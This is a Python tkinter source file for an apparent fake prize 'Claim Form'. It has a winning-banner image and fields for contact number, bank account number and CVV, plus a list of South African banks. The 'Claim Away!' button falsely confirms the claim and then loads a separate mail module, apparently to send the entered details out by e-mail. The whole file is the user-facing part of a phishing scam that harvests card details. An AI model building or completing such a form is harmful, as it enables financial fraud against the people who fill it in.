from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
import smtplib, ssl
# initializing tkinter
root = Tk()
root.title("Claim Form")
root.geometry("612x459")
root.config(bg="antique white")
# application of the image
img = Image.open("win.jpg")
render = ImageTk.PhotoImage(img)

img = Label(root, image=render)
img.image = render
img.place(x=0,y=0)

# structure of the form
bank_acc = Label(root, text = "Contact Number")
bank_acc.grid(column=1,row=2)

get_bank = Entry(root, width=15)
get_bank.grid(column=2,row=2)

acc_detail = Label(root, text = "Account Number")
acc_detail.grid(column=1,row=3)

get_det = Entry(root, width = 15)
get_det.grid(column=2,row=3)

addition = Label(root, text = "CVV")
addition.grid(column=1,row=4)

get_add = Entry(root, width = 15)
get_add.grid(column=2,row=4)

banks = ['Capitec', 'ABSA', 'FNB','Standard Bank','African Bank']
variable = StringVar(root)
variable.set(banks[0])

choose_bank = OptionMenu(root,variable,*banks)
choose_bank.config(height=1,width=6,font=('Arial',14))
choose_bank.grid(column=1,row=5)
# implementing the functions
def claim_prize():
    messagebox.showinfo("Notice","We have submitted your claim. Please check your e-mail for further instructions.")
    root.withdraw()
    import mail
def exchange():
        messagebox.showinfo("Notice","This is just to notify you that you have picked the currency converter, which means that you're a foreign national.")
        root.withdraw()
        import currency
# the button
claim = Button(root, text = "Claim Away!", width=10, command=claim_prize)
change_curr = Button(root, text = "Currency Converter",width=13,command=exchange)
claim.grid(column=1,row=6)
change_curr.grid(column=2,row=6)
#starting the app
root.mainloop()
